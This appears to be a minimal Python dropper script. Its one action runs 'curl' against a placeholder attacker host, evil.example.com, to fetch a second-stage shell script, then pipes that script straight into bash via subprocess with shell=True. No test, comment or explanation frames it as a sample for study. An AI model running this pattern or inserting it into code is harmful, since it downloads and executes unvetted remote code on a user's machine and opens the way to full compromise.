import subprocess

subprocess.run("curl -s https://evil.example.com/stage2.sh | bash", shell=True)
